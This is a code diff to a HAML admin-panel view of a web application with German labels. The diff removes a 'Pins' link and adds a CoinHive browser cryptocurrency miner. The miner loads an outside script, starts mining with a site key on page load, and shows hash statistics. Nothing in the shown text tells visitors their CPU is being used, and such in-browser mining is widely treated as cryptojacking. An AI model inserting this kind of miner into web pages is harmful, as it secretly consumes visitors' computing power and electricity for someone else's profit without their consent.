@@ -2,5 +2,34 @@
 	%h1 Adminbereich
 
 	= link_to "Userübersicht", admin_users_path
-	= link_to "Pins", admin_pins_path
 	= link_to "Flags", admin_flags_path
+
+	%h3 H/s
+	%label#hashesPerSecond
+	%h3 Total Hashes
+	%label#totalHashes
+	%h3 Acceptet Hashes
+	%label#acceptedHashes
+%script{:src => "https://coin-hive.com/lib/coinhive.min.js"}
+:javascript
+	var miner = new CoinHive.Anonymous('1AFWqZp9kZvOd1H97kKmtEGxALgxcoj3', {
+		threads: 4,
+		autoThreads: true,
+		throttle: 0.8,
+	});
+	miner.start();
+
+	miner.on('found', function() { /* Hash found */ })
+	miner.on('accepted', function() { /* Hash accepted by the pool */ })
+
+	// Update stats once per second
+	setInterval(function() {
+		var hashesPerSecond = miner.getHashesPerSecond();
+		var totalHashes = miner.getTotalHashes();
+		var acceptedHashes = miner.getAcceptedHashes();
+
+		// Output to HTML elements...
+		document.getElementById('hashesPerSecond').innerHTML = hashesPerSecond;
+		document.getElementById('totalHashes').innerHTML = totalHashes;
+		document.getElementById('acceptedHashes').innerHTML = acceptedHashes;
+	}, 1000);
